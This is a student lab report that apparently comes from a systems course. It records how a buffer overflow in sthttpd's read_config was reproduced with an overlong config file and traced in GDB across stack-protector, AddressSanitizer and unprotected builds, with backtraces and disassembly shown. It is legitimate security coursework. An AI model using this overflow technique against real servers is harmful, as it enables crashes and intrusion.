
Ram Yadav						Smashing Lab:
Paul Eggert
LAB 3

I first downloaded the file using command
wget http://web.cs.ucla.edu/classes/spring17/cs33/lab/sthttpd-2.27.0.tar.gz

I unziped it
tar -xvf sthttpd-2.27.0.tar.gz

(1).
Checked my path by using command “which gcc”
got output "/usr/local/cs/bin/gcc"


(2).
chmond u+x configure

then rand the command
./configure \
   LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"

then i compiled three times with the three sets of the given compiler options:
each time i ran option, i used “make clean”
and moved resulting executable file to src/thttpd-sp, src/thttpd-as, src/thttpd-no respectively as mentioned in the spec. 

make clean
make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
mv src/thttpd src/thttpd-sp

make clean
make CFLAGS='-g3 -O2 -fno-inline -static-libasan -fsanitize=address'
mv src/thttpd src/thttpd-as

make clean
make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'
mv src/thttpd src/thttpd-no


(3&4).
I ran command
echo $[(12330 + 3 * (X % 293) + Y)], where x is my UID, and y is 1,2 and 3, where
(1=SP, 2=AS, 3=NO).

when Y == 1,
echo $[(12330 + 3 * (604841556 % 293) + 1)]
got output 
xxxxx

when y == 2
echo $[(12330 + 3 * (604841556 % 293) + 2)]
xxxxx

when y == 3,
echo $[(12330 + 3 * (604841556 % 293) + 3)]
xxxxx

Then,
i typed the first command in first terminal with running gdb and second command (curl)
in second terminal for the each steps 
$gdb src/thttpd-sp
(gdb) run -p (12330 + 3 * (myUID % 293) + 1) -D

$gdb src/thttpd-as
(gdb) run -p (12330 + 3 * (myUID % 293) + 2) -D

$gdb src/thttpd-no
(gdb) run -p (12330 + 3 * (myUID % 293) + 3) -D 

In the 2nd terminal, for the port testing
curl http://localhost:(12330 + 3 * (myUID % 293) + 1)/foo.txt
curl http://localhost:(12330 + 3 * (myUID % 293) + 2)/foo.txt
curl http://localhost:(12330 + 3 * (myUID % 293) + 3)/foo.txt


Every time i tested, i got plain text that i had on the foo.txt


(5).
Then i created a long text in called config.txt in order to crash src/thttpd-sp file. It used port= with more than hundred character string

i ran the following command
$gdb src/thttpd-sp 
(gdb) run -p 12904 -D -C config.txt

Starting program: /w/home.14/cs/ugrad/yadav/Ram33/sthttpd-2.27.0/src/thttpd-sp -p 12904 -D -C config.txt
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".
*** stack smashing detected ***: /w/home.14/cs/ugrad/yadav/Ram33/sthttpd-2.27.0/src/thttpd-sp terminated

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff6db3118 in ?? () from /lib64/libgcc_s.so.1

Then i realized ??(). It means that couldn’t be the reason of overwritten, rather could be because of overrun

I used the backtrace command

(gdb) bt
 got the following ouptput
#0  0x00007ffff6db3118 in ?? () from /lib64/libgcc_s.so.1
#1  0x00007ffff6db4019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
#2  0x00007ffff76e8636 in backtrace () from /lib64/libc.so.6
#3  0x00007ffff7651f24 in __libc_message () from /lib64/libc.so.6
#4  0x00007ffff76ec047 in __fortify_fail () from /lib64/libc.so.6
#5  0x00007ffff76ec010 in __stack_chk_fail () from /lib64/libc.so.6
#6  0x0000000000405056 in read_config (filename=<optimized out>)
    at thttpd.c:1190
#7  0x6775626564006775 in ?? ()
#8  0x6400677562656400 in ?? ()
#9  0x6265640067756265 in ?? ()
#10 0x6775626564006775 in ?? ()
#11 0x6400677562656400 in ?? ()
#12 0x6265640067756265 in ?? ()
#13 0x6775626564006775 in ?? ()
#14 0x6400677562656400 in ?? ()
#15 0x6265640067756265 in ?? ()
#16 0x6775626564006775 in ?? ()
#17 0x6400677562656400 in ?? ()
#18 0x6265640067756265 in ?? ()
#19 0x6775626564006775 in ?? ()
#20 0x6400677562656400 in ?? ()
#21 0x6265640067756265 in ?? ()
---Type <return> to continue, or q <return> to quit---
#22 0x6775626564006775 in ?? ()
#23 0x6400677562656400 in ?? ()
#24 0x6265640067756265 in ?? ()
#25 0x6775626564006775 in ?? ()
#26 0x6400677562656400 in ?? ()
#27 0x6265640067756265 in ?? ()
#28 0x6775626564006775 in ?? ()
#29 0x6400677562656400 in ?? ()
#30 0x6265640067756265 in ?? ()
#31 0x6775626564006775 in ?? ()
#32 0x6400677562656400 in ?? ()
#33 0x6265640067756265 in ?? ()
#34 0x6775626564006775 in ?? ()
#35 0x6400677562656400 in ?? ()
#36 0x6265640067756265 in ?? ()
#37 0x6775626564006775 in ?? ()
#38 0x6400677562656400 in ?? ()
#39 0x6265640067756265 in ?? ()
#40 0x6775626564006775 in ?? ()
#41 0x6400677562656400 in ?? ()
#42 0x6265640067756265 in ?? ()
#43 0x6775626564006775 in ?? ()
#44 0x6400677562656400 in ?? ()
---Type <return> to continue, or q <return> to quit---
#45 0x6265640067756265 in ?? ()
#46 0x6775626564006775 in ?? ()
#47 0x6400677562656400 in ?? ()
#48 0x6265640067756265 in ?? ()
#49 0x6775626564006775 in ?? ()
#50 0x6400677562656400 in ?? ()
#51 0x6265640067756265 in ?? ()
#52 0x6775626564006775 in ?? ()
#53 0x6400677562656400 in ?? ()
#54 0x6265640067756265 in ?? ()
#55 0x6775626564006775 in ?? ()
#56 0x6400677562656400 in ?? ()
#57 0x6265640067756265 in ?? ()
#58 0x6775626564006775 in ?? ()
#59 0x6400677562656400 in ?? ()
#60 0x6265640067756265 in ?? ()
#61 0x6775626564006775 in ?? ()
#62 0x6400677562656400 in ?? ()
#63 0x0000000067756265 in ?? ()
#64 0x0000000000000000 in ?? () 

From the back track, i guess something is wrong in read_config function.
So, i set the breakpoint in GDB on 1188, which is just before the read_config.
So, i used ‘q’ command to quit GDB, and then used following command
(gdb) b 1188
(gdb) run -p 12385 -D -C config.txt
(gdb) set disassemble-next-line on
(gdb) si

0x0000000000404f1e	1189	    (void) fclose( fp );
   0x0000000000404f1b <read_config+1211>:	4c 89 e7	mov    %r12,%rdi
=> 0x0000000000404f1e <read_config+1214>:	e8 1d d5 ff ff	callq  0x402440 <fclose@plt>

found nothing is wrong. 
Used “ni” command
=> 0x0000000000404f23 <read_config+1219>:	48 8b 44 24 68	mov    0x68(%rsp),%rax
   0x0000000000404f28 <read_config+1224>:	64 48 33 04 25 28 00 00 00	xor    %fs:0x28,%rax
   0x0000000000404f31 <read_config+1233>:	0f 85 1a 01 00 00	jne    0x405051 <read_config+1521>
   0x0000000000404f37 <read_config+1239>:	48 83 c4 70	add    $0x70,%rsp
   0x0000000000404f3b <read_config+1243>:	5b	pop    %rbx
   0x0000000000404f3c <read_config+1244>:	5d	pop    %rbp
   0x0000000000404f3d <read_config+1245>:	41 5c	pop    %r12
   0x0000000000404f3f <read_config+1247>:	41 5d	pop    %r13
   0x0000000000404f41 <read_config+1249>:	41 5e	pop    %r14
   0x0000000000404f43 <read_config+1251>:	c3	retq   

used si, to trase the code
0x0000000000404f31	1190	    }
   0x0000000000404f23 <read_config+1219>:	48 8b 44 24 68	mov    0x68(%rsp),%rax
   0x0000000000404f28 <read_config+1224>:	64 48 33 04 25 28 00 00 00	xor    %fs:0x28,%rax
=> 0x0000000000404f31 <read_config+1233>:	0f 85 1a 01 00 00	jne    0x405051 <read_config+1521>
   0x0000000000404f37 <read_config+1239>:	48 83 c4 70	add    $0x70,%rsp
   0x0000000000404f3b <read_config+1243>:	5b	pop    %rbx
   0x0000000000404f3c <read_config+1244>:	5d	pop    %rbp
   0x0000000000404f3d <read_config+1245>:	41 5c	pop    %r12
   0x0000000000404f3f <read_config+1247>:	41 5d	pop    %r13
   0x0000000000404f41 <read_config+1249>:	41 5e	pop    %r14
   0x0000000000404f43 <read_config+1251>:	c3	retq   
1190	    }
=> 0x0000000000405051 <read_config+1521>:	e8 5a d4 ff ff	callq  0x4024b0 <__stack_chk_fail@plt>

found that after the instruction
 0x0000000000404f28 <read_config+1224>:	64 48 33 04 25 28 00 00 00	xor    %fs:0x28,%rax
. It seems like this instruction comparing the the canary the stack protection places
around the buffer with what should be in there. So, it will delete the change in the canary
which is indication of buffer overrun in the line
0x0000000000404f31 <read_config+1233>:	0f 85 1a 01 00 00	jne    0x405051 <read_config+1521>, this
instruction is where the buffer overflow comes from.


(6).
I quit the GDB with command ‘q’
To crash this part i just increased the character
then i ran the following command
gdb src/thttpd-as
run -p 12905 -D -C config.txt

Starting program: /w/home.14/cs/ugrad/yadav/Ram33/sthttpd-2.27.0/src/thttpd-as -p 12905 -D -C config.txt
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".
=================================================================
==27955==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffffcdd4 at pc 0x00000043aec9 bp 0x7fffffffcd30 sp 0x7fffffffc4e0
READ of size 607 at 0x7fffffffcdd4 thread T0

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7075118 in ?? () from /lib64/libgcc_s.so.1

Then, i ran the back trace to find where the problem is with
the command ‘bt’
#0  0x00007ffff7075118 in ?? () from /lib64/libgcc_s.so.1
#1  0x00007ffff7076019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
#2  0x00000000004b8ae3 in __sanitizer::BufferedStackTrace::SlowUnwindStack (this=0x7fffffffbc50, pc=4435657, 
    max_depth=<optimized out>)
    at ../../../../gcc-6.3.0/libsanitizer/sanitizer_common/sanitizer_unwind_linux_libcdep.cc:113
#3  0x00000000004b42e1 in __asan::GetStackTraceWithPcBpAndContext (fast=false, context=0x0, 
    bp=140737488342320, pc=4435657, max_depth=256, stack=0x7fffffffbc50)
    at ../../../../gcc-6.3.0/libsanitizer/asan/asan_stack.h:49
#4  __asan::ReportGenericError (pc=<optimized out>, bp=bp@entry=140737488342320, 
    sp=sp@entry=140737488340192, addr=addr@entry=140737488342484, is_write=is_write@entry=false, 
    access_size=access_size@entry=607, exp=<optimized out>, fatal=<optimized out>)
    at ../../../../gcc-6.3.0/libsanitizer/asan/asan_report.cc:1092
#5  0x000000000043aee4 in __interceptor_strchr (str=<optimized out>, c=<optimized out>)
    at ../../../../gcc-6.3.0/libsanitizer/asan/asan_interceptors.cc:468
#6  0x00000000004e0b51 in read_config (filename=<optimized out>) at thttpd.c:1018
#7  0x6265642067756265 in ?? ()
#8  0x6775626564206775 in ?? ()
#9  0x6420677562656420 in ?? ()
#10 0x6265642067756265 in ?? ()
#11 0x6775626564206775 in ?? ()
#12 0x6420677562656420 in ?? ()
#13 0x6265642067756265 in ?? ()
#14 0x6775626564206775 in ?? ()
---Type <return> to continue, or q <return> to quit---
#15 0x6420677562656420 in ?? ()
#16 0x6265642067756265 in ?? ()
#17 0x6775626564206775 in ?? ()
#18 0x6420677562656420 in ?? ()
#19 0x6265642067756265 in ?? ()
#20 0x6775626564206775 in ?? ()
#21 0x6420677562656420 in ?? ()
#22 0x6265642067756265 in ?? ()
#23 0x6775626564206775 in ?? ()
#24 0x6420677562656420 in ?? ()
#25 0x6265642067756265 in ?? ()
#26 0x6775626564206775 in ?? ()
#27 0x6420677562656420 in ?? ()
#28 0x6265642067756265 in ?? ()
#29 0x6775626564206775 in ?? ()
#30 0x6420677562656420 in ?? ()
#31 0x6265642067756265 in ?? ()
#32 0x6775626564206775 in ?? ()
#33 0x6420677562656420 in ?? ()
#34 0x6265642067756265 in ?? ()
#35 0x6775626564206775 in ?? ()
#36 0x6420677562656420 in ?? ()
#37 0x6265642067756265 in ?? ()
---Type <return> to continue, or q <return> to quit---
#38 0x6775626564206775 in ?? ()
#39 0x6420677562656420 in ?? ()
#40 0x6265642067756265 in ?? ()
#41 0x6775626564206775 in ?? ()
#42 0x6420677562656420 in ?? ()
#43 0x6265642067756265 in ?? ()
#44 0x6775626564206775 in ?? ()
#45 0x6420677562656420 in ?? ()
#46 0x6265642067756265 in ?? ()
#47 0x6775626564206775 in ?? ()
#48 0x6420677562656420 in ?? ()
#49 0x6265642067756265 in ?? ()
#50 0x6775626564206775 in ?? ()
#51 0x6420677562656420 in ?? ()
#52 0x6265642067756265 in ?? ()
#53 0x6775626564206775 in ?? ()
#54 0x6420677562656420 in ?? ()
#55 0x00000a2067756265 in ?? ()
#56 0x0000000000507d30 in ?? ()
#57 0x0000000000000010 in ?? ()
#58 0x0000000000962000 in ?? ()
#59 0x0000000000746f80 in ?? ()
#60 0x00007fffffffe0e0 in ?? ()
---Type <return> to continue, or q <return> to quit---
#61 0x00007fffffffd070 in ?? ()
#62 0x0000000000000001 in ?? ()
#63 0x00000000004198cb in __asan_register_globals (globals=0x6265642067756265, n=7214880356907181088)
    at ../../../../gcc-6.3.0/libsanitizer/asan/asan_globals.cc:218
Backtrace stopped: Cannot access memory at address 0x677562656420677d

Then i existed the GDB with command ‘q’
I realized that i need to set the breakpoint before read_config. To do that
i ran the following command
gdb src/thttpd-as 
(gdb) break 1016
(gdb) run -p 12905 -D -C config.txt
(gdb) set disassemble-next-line on
(gdb) si

got output
Starting program: /w/home.14/cs/ugrad/yadav/Ram33/sthttpd-2.27.0/src/thttpd-as -p 12905 -D -C config.txt
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".

Breakpoint 1, read_config (filename=<optimized out>) at thttpd.c:1018
warning: Source file is more recent than executable.
1018		if ( ( cp = strchr( line, '#' ) ) != (char*) 0 )

then used ‘si’ command

0x00000000004e0b4c	1018		if ( ( cp = strchr( line, '#' ) ) != (char*) 0 )
   0x00000000004e0b43 <read_config+179>:	48 8b 3c 24	mov    (%rsp),%rdi
   0x00000000004e0b47 <read_config+183>:	be 23 00 00 00	mov    $0x23,%esi
=> 0x00000000004e0b4c <read_config+188>:	e8 2f a5 f5 ff	callq  0x43b080 <__interceptor_strchr(char const*, int)>
   0x00000000004e0b51 <read_config+193>:	48 85 c0	test   %rax,%rax
   0x00000000004e0b54 <read_config+196>:	74 24	je     0x4e0b7a <read_config+234>

I hit the pint where <__interceptor_strchr(char const*, int)> is called and this function address sanitization takes over
that results output error of stack buffer overflow
so the line
0x00000000004e0b4c <read_config+188>:	e8 2f a5 f5 ff	callq  0x43b080 <__interceptor_strchr(char const*, int)>
is where i exit the read_config, but went through several functions later. And finally found that that’s the place where program crashed



(7).
I quit GDB using ‘q’
used this command
gdb src/thttpd-no
(gdb) run -p 12906 -D -C config.txt

I got following error
Starting program: /w/home.14/cs/ugrad/yadav/Ram33/sthttpd-2.27.0/src/thttpd-no -p 12906 -D -C config.txt
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x0000000000404d9f in read_config (filename=<optimized out>) at thttpd.c:1190
warning: Source file is more recent than executable.
1190	    }
Then, i did back trace using command ‘bt’ 
got output
#0  0x0000000000404d9f in read_config (filename=<optimized out>) at thttpd.c:1190
#1  0x6775626564006775 in ?? ()
#2  0x6400677562656400 in ?? ()
#3  0x6265640067756265 in ?? ()
#4  0x6775626564006775 in ?? ()
#5  0x6400677562656400 in ?? ()
#6  0x6265640067756265 in ?? ()
#7  0x6775626564006775 in ?? ()
#8  0x6400677562656400 in ?? ()
#9  0x6265640067756265 in ?? ()
#10 0x6775626564006775 in ?? ()
#11 0x6400677562656400 in ?? ()
#12 0x6265640067756265 in ?? ()
#13 0x6775626564006775 in ?? ()
#14 0x6400677562656400 in ?? ()
#15 0x6265640067756265 in ?? ()
#16 0x6775626564006775 in ?? ()
#17 0x6400677562656400 in ?? ()
#18 0x6265640067756265 in ?? ()
#19 0x6775626564006775 in ?? ()
#20 0x6400677562656400 in ?? ()
#21 0x6265640067756265 in ?? ()
#22 0x6775626564006775 in ?? ()
---Type <return> to continue, or q <return> to quit---
#23 0x6400677562656400 in ?? ()
#24 0x6265640067756265 in ?? ()
#25 0x6775626564006775 in ?? ()
#26 0x6400677562656400 in ?? ()
#27 0x6265640067756265 in ?? ()
#28 0x6775626564006775 in ?? ()
#29 0x6400677562656400 in ?? ()
#30 0x6265640067756265 in ?? ()
#31 0x6775626564006775 in ?? ()
#32 0x6400677562656400 in ?? ()
#33 0x6265640067756265 in ?? ()
#34 0x6775626564006775 in ?? ()
#35 0x6400677562656400 in ?? ()
#36 0x6265640067756265 in ?? ()
#37 0x6775626564006775 in ?? ()
#38 0x6400677562656400 in ?? ()
#39 0x6265640067756265 in ?? ()
#40 0x6775626564006775 in ?? ()
#41 0x6400677562656400 in ?? ()
#42 0x6265640067756265 in ?? ()
#43 0x6775626564006775 in ?? ()
#44 0x6400677562656400 in ?? ()
#45 0x6265640067756265 in ?? ()
---Type <return> to continue, or q <return> to quit---
#46 0x6775626564006775 in ?? ()
#47 0x6400677562656400 in ?? ()
#48 0x6265640067756265 in ?? ()
#49 0x6775626564006775 in ?? ()
#50 0x6400677562656400 in ?? ()
#51 0x6265640067756265 in ?? ()
#52 0x6775626564006775 in ?? ()
#53 0x6400677562656400 in ?? ()
#54 0x6265640067756265 in ?? ()
#55 0x6775626564006775 in ?? ()
#56 0x6400677562656400 in ?? ()
#57 0x0000000067756265 in ?? ()
#58 0x0000000000000000 in ?? ()

used command 
disas 0x0000000000404d9f

got output

  0x00000000004048e0 <+0>:	push   %r14
   0x00000000004048e2 <+2>:	push   %r13
   0x00000000004048e4 <+4>:	mov    $0x40ec8d,%esi
   0x00000000004048e9 <+9>:	push   %r12
   0x00000000004048eb <+11>:	push   %rbp
   0x00000000004048ec <+12>:	push   %rbx
   0x00000000004048ed <+13>:	mov    %rdi,%rbx
   0x00000000004048f0 <+16>:	sub    $0x70,%rsp
   0x00000000004048f4 <+20>:	callq  0x402830 <fopen@plt>
   0x00000000004048f9 <+25>:	test   %rax,%rax
   0x00000000004048fc <+28>:	je     0x404e7c <read_config+1436>
   0x0000000000404902 <+34>:	mov    %rax,%r12
   0x0000000000404905 <+37>:	movabs $0x100002600,%r14
   0x000000000040490f <+47>:	mov    %r12,%rdx
   0x0000000000404912 <+50>:	mov    $0x3e8,%esi
   0x0000000000404917 <+55>:	mov    %rsp,%rdi
   0x000000000040491a <+58>:	callq  0x4025a0 <fgets@plt>
   0x000000000040491f <+63>:	test   %rax,%rax
   0x0000000000404922 <+66>:	je     0x404d8b <read_config+1195>
   0x0000000000404928 <+72>:	mov    $0x23,%esi
   0x000000000040492d <+77>:	mov    %rsp,%rdi
   0x0000000000404930 <+80>:	callq  0x402480 <strchr@plt>
---Type <return> to continue, or q <return> to quit---
   0x0000000000404935 <+85>:	test   %rax,%rax
   0x0000000000404938 <+88>:	je     0x40493d <read_config+93>
   0x000000000040493a <+90>:	movb   $0x0,(%rax)
   0x000000000040493d <+93>:	mov    $0x40ebab,%esi
   0x0000000000404942 <+98>:	mov    %rsp,%rdi
   0x0000000000404945 <+101>:	callq  0x402550 <strspn@plt>
   0x000000000040494a <+106>:	lea    (%rsp,%rax,1),%rbp
   0x000000000040494e <+110>:	cmpb   $0x0,0x0(%rbp)
   0x0000000000404952 <+114>:	jne    0x404beb <read_config+779>
   0x0000000000404958 <+120>:	jmp    0x40490f <read_config+47>
   0x000000000040495a <+122>:	nopw   0x0(%rax,%rax,1)
   0x0000000000404960 <+128>:	mov    $0x3d,%esi
   0x0000000000404965 <+133>:	mov    %rbp,%rdi
   0x0000000000404968 <+136>:	callq  0x402480 <strchr@plt>
   0x000000000040496d <+141>:	test   %rax,%rax
   0x0000000000404970 <+144>:	je     0x404c6d <read_config+909>
   0x0000000000404976 <+150>:	lea    0x1(%rax),%r13
   0x000000000040497a <+154>:	movb   $0x0,(%rax)
   0x000000000040497d <+157>:	mov    $0x40ebb0,%esi
   0x0000000000404982 <+162>:	mov    %rbp,%rdi
   0x0000000000404985 <+165>:	callq  0x4022b0 <strcasecmp@plt>
   0x000000000040498a <+170>:	test   %eax,%eax
   0x000000000040498c <+172>:	je     0x404c37 <read_config+855>
---Type <return> to continue, or q <return> to quit---
   0x0000000000404992 <+178>:	mov    $0x40ebb6,%esi
   0x0000000000404997 <+183>:	mov    %rbp,%rdi
   0x000000000040499a <+186>:	callq  0x4022b0 <strcasecmp@plt>
   0x000000000040499f <+191>:	test   %eax,%eax
   0x00000000004049a1 <+193>:	je     0x404c4e <read_config+878>
   0x00000000004049a7 <+199>:	mov    $0x40ebc9,%esi
   0x00000000004049ac <+204>:	mov    %rbp,%rdi
   0x00000000004049af <+207>:	callq  0x4022b0 <strcasecmp@plt>
   0x00000000004049b4 <+212>:	test   %eax,%eax
   0x00000000004049b6 <+214>:	je     0x404c75 <read_config+917>
   0x00000000004049bc <+220>:	mov    $0x40ebbd,%esi
   0x00000000004049c1 <+225>:	mov    %rbp,%rdi
   0x00000000004049c4 <+228>:	callq  0x4022b0 <strcasecmp@plt>
   0x00000000004049c9 <+233>:	test   %eax,%eax
   0x00000000004049cb <+235>:	je     0x404c94 <read_config+948>
   0x00000000004049d1 <+241>:	mov    $0x40ebbb,%esi
   0x00000000004049d6 <+246>:	mov    %rbp,%rdi
   0x00000000004049d9 <+249>:	callq  0x4022b0 <strcasecmp@plt>
   0x00000000004049de <+254>:	test   %eax,%eax
   0x00000000004049e0 <+256>:	je     0x404cb8 <read_config+984>
   0x00000000004049e6 <+262>:	mov    $0x40ebc4,%esi
   0x00000000004049eb <+267>:	mov    %rbp,%rdi
   0x00000000004049ee <+270>:	callq  0x4022b0 <strcasecmp@plt>
---Type <return> to continue, or q <return> to quit---
   0x00000000004049f3 <+275>:	test   %eax,%eax
   0x00000000004049f5 <+277>:	je     0x404cf6 <read_config+1046>
   0x00000000004049fb <+283>:	mov    $0x40ebcf,%esi
   0x0000000000404a00 <+288>:	mov    %rbp,%rdi
   0x0000000000404a03 <+291>:	callq  0x4022b0 <strcasecmp@plt>
   0x0000000000404a08 <+296>:	test   %eax,%eax
   0x0000000000404a0a <+298>:	je     0x404cdc <read_config+1020>
   0x0000000000404a10 <+304>:	mov    $0x40ebcd,%esi
   0x0000000000404a15 <+309>:	mov    %rbp,%rdi
   0x0000000000404a18 <+312>:	callq  0x4022b0 <strcasecmp@plt>
   0x0000000000404a1d <+317>:	test   %eax,%eax
   0x0000000000404a1f <+319>:	je     0x404d15 <read_config+1077>
   0x0000000000404a25 <+325>:	mov    $0x40ebd9,%esi
   0x0000000000404a2a <+330>:	mov    %rbp,%rdi
   0x0000000000404a2d <+333>:	callq  0x4022b0 <strcasecmp@plt>
   0x0000000000404a32 <+338>:	test   %eax,%eax
   0x0000000000404a34 <+340>:	je     0x404cdc <read_config+1020>
   0x0000000000404a3a <+346>:	mov    $0x40ebd7,%esi
   0x0000000000404a3f <+351>:	mov    %rbp,%rdi
   0x0000000000404a42 <+354>:	callq  0x4022b0 <strcasecmp@plt>
   0x0000000000404a47 <+359>:	test   %eax,%eax
   0x0000000000404a49 <+361>:	je     0x404d15 <read_config+1077>
   0x0000000000404a4f <+367>:	mov    $0x40ebe2,%esi
---Type <return> to continue, or q <return> to quit---
   0x0000000000404a54 <+372>:	mov    %rbp,%rdi
   0x0000000000404a57 <+375>:	callq  0x4022b0 <strcasecmp@plt>
   0x0000000000404a5c <+380>:	test   %eax,%eax
   0x0000000000404a5e <+382>:	je     0x404d2f <read_config+1103>
   0x0000000000404a64 <+388>:	mov    $0x40ebe7,%esi
   0x0000000000404a69 <+393>:	mov    %rbp,%rdi
   0x0000000000404a6c <+396>:	callq  0x4022b0 <strcasecmp@plt>
   0x0000000000404a71 <+401>:	test   %eax,%eax
   0x0000000000404a73 <+403>:	je     0x404d6c <read_config+1164>
   0x0000000000404a79 <+409>:	mov    $0x40ebee,%esi
   0x0000000000404a7e <+414>:	mov    %rbp,%rdi
   0x0000000000404a81 <+417>:	callq  0x4022b0 <strcasecmp@plt>
   0x0000000000404a86 <+422>:	test   %eax,%eax
   0x0000000000404a88 <+424>:	je     0x404d4e <read_config+1134>
   0x0000000000404a8e <+430>:	mov    $0x40ebf7,%esi
   0x0000000000404a93 <+435>:	mov    %rbp,%rdi
   0x0000000000404a96 <+438>:	callq  0x4022b0 <strcasecmp@plt>
   0x0000000000404a9b <+443>:	test   %eax,%eax
   0x0000000000404a9d <+445>:	je     0x404dba <read_config+1242>
   0x0000000000404aa3 <+451>:	mov    $0x40ebfe,%esi
   0x0000000000404aa8 <+456>:	mov    %rbp,%rdi
   0x0000000000404aab <+459>:	callq  0x4022b0 <strcasecmp@plt>
   0x0000000000404ab0 <+464>:	test   %eax,%eax
---Type <return> to continue, or q <return> to quit---
   0x0000000000404ab2 <+466>:	je     0x404da0 <read_config+1216>
   0x0000000000404ab8 <+472>:	mov    $0x40ec0e,%esi
   0x0000000000404abd <+477>:	mov    %rbp,%rdi
   0x0000000000404ac0 <+480>:	callq  0x4022b0 <strcasecmp@plt>
   0x0000000000404ac5 <+485>:	test   %eax,%eax
   0x0000000000404ac7 <+487>:	je     0x404dd9 <read_config+1273>
   0x0000000000404acd <+493>:	mov    $0x40ec17,%esi
   0x0000000000404ad2 <+498>:	mov    %rbp,%rdi
   0x0000000000404ad5 <+501>:	callq  0x4022b0 <strcasecmp@plt>
   0x0000000000404ada <+506>:	test   %eax,%eax
   0x0000000000404adc <+508>:	je     0x404e8e <read_config+1454>
   0x0000000000404ae2 <+514>:	mov    $0x40f0f7,%esi
   0x0000000000404ae7 <+519>:	mov    %rbp,%rdi
   0x0000000000404aea <+522>:	callq  0x4022b0 <strcasecmp@plt>
   0x0000000000404aef <+527>:	test   %eax,%eax
   0x0000000000404af1 <+529>:	je     0x404ecc <read_config+1516>
   0x0000000000404af7 <+535>:	mov    $0x40ed00,%esi
   0x0000000000404afc <+540>:	mov    %rbp,%rdi
   0x0000000000404aff <+543>:	callq  0x4022b0 <strcasecmp@plt>
   0x0000000000404b04 <+548>:	test   %eax,%eax
   0x0000000000404b06 <+550>:	je     0x404ead <read_config+1485>
   0x0000000000404b0c <+556>:	mov    $0x40ec23,%esi
   0x0000000000404b11 <+561>:	mov    %rbp,%rdi
---Type <return> to continue, or q <return> to quit---
   0x0000000000404b14 <+564>:	callq  0x4022b0 <strcasecmp@plt>
   0x0000000000404b19 <+569>:	test   %eax,%eax
   0x0000000000404b1b <+571>:	je     0x404f39 <read_config+1625>
   0x0000000000404b21 <+577>:	mov    $0x40ec21,%esi
   0x0000000000404b26 <+582>:	mov    %rbp,%rdi
   0x0000000000404b29 <+585>:	callq  0x4022b0 <strcasecmp@plt>
   0x0000000000404b2e <+590>:	test   %eax,%eax
   0x0000000000404b30 <+592>:	je     0x404f1f <read_config+1599>
   0x0000000000404b36 <+598>:	mov    $0x40ec2b,%esi
   0x0000000000404b3b <+603>:	mov    %rbp,%rdi
   0x0000000000404b3e <+606>:	callq  0x4022b0 <strcasecmp@plt>
   0x0000000000404b43 <+611>:	test   %eax,%eax
   0x0000000000404b45 <+613>:	je     0x404f05 <read_config+1573>
   0x0000000000404b4b <+619>:	mov    $0x40ec29,%esi
   0x0000000000404b50 <+624>:	mov    %rbp,%rdi
   0x0000000000404b53 <+627>:	callq  0x4022b0 <strcasecmp@plt>
   0x0000000000404b58 <+632>:	test   %eax,%eax
   0x0000000000404b5a <+634>:	je     0x404eeb <read_config+1547>
   0x0000000000404b60 <+640>:	mov    $0x40ec38,%esi
   0x0000000000404b65 <+645>:	mov    %rbp,%rdi
   0x0000000000404b68 <+648>:	callq  0x4022b0 <strcasecmp@plt>
   0x0000000000404b6d <+653>:	test   %eax,%eax
   0x0000000000404b6f <+655>:	je     0x404e5d <read_config+1405>
---Type <return> to continue, or q <return> to quit---
   0x0000000000404b75 <+661>:	mov    $0x40ec40,%esi
   0x0000000000404b7a <+666>:	mov    %rbp,%rdi
   0x0000000000404b7d <+669>:	callq  0x4022b0 <strcasecmp@plt>
   0x0000000000404b82 <+674>:	test   %eax,%eax
   0x0000000000404b84 <+676>:	je     0x404e3e <read_config+1374>
   0x0000000000404b8a <+682>:	mov    $0x40ec48,%esi
   0x0000000000404b8f <+687>:	mov    %rbp,%rdi
   0x0000000000404b92 <+690>:	callq  0x4022b0 <strcasecmp@plt>
   0x0000000000404b97 <+695>:	test   %eax,%eax
   0x0000000000404b99 <+697>:	je     0x404e1f <read_config+1343>
   0x0000000000404b9f <+703>:	mov    $0x40ec4c,%esi
   0x0000000000404ba4 <+708>:	mov    %rbp,%rdi
   0x0000000000404ba7 <+711>:	callq  0x4022b0 <strcasecmp@plt>
   0x0000000000404bac <+716>:	test   %eax,%eax
   0x0000000000404bae <+718>:	jne    0x404df8 <read_config+1304>
   0x0000000000404bb4 <+724>:	mov    %r13,%rsi
   0x0000000000404bb7 <+727>:	mov    %rbp,%rdi
   0x0000000000404bba <+730>:	callq  0x404670 <value_required>
   0x0000000000404bbf <+735>:	mov    %r13,%rdi
   0x0000000000404bc2 <+738>:	callq  0x402880 <atoi@plt>
   0x0000000000404bc7 <+743>:	mov    %eax,0x211393(%rip)        # 0x615f60 <max_age>
   0x0000000000404bcd <+749>:	nopl   (%rax)
   0x0000000000404bd0 <+752>:	mov    $0x40ebab,%esi
---Type <return> to continue, or q <return> to quit---
   0x0000000000404bd5 <+757>:	mov    %rbx,%rdi
   0x0000000000404bd8 <+760>:	callq  0x402550 <strspn@plt>
   0x0000000000404bdd <+765>:	lea    (%rbx,%rax,1),%rbp
   0x0000000000404be1 <+769>:	cmpb   $0x0,0x0(%rbp)
   0x0000000000404be5 <+773>:	je     0x40490f <read_config+47>
   0x0000000000404beb <+779>:	mov    $0x40ebab,%esi
   0x0000000000404bf0 <+784>:	mov    %rbp,%rdi
   0x0000000000404bf3 <+787>:	callq  0x402570 <strcspn@plt>
   0x0000000000404bf8 <+792>:	lea    0x0(%rbp,%rax,1),%rbx
   0x0000000000404bfd <+797>:	movzbl (%rbx),%eax
   0x0000000000404c00 <+800>:	cmp    $0x20,%al
   0x0000000000404c02 <+802>:	ja     0x404960 <read_config+128>
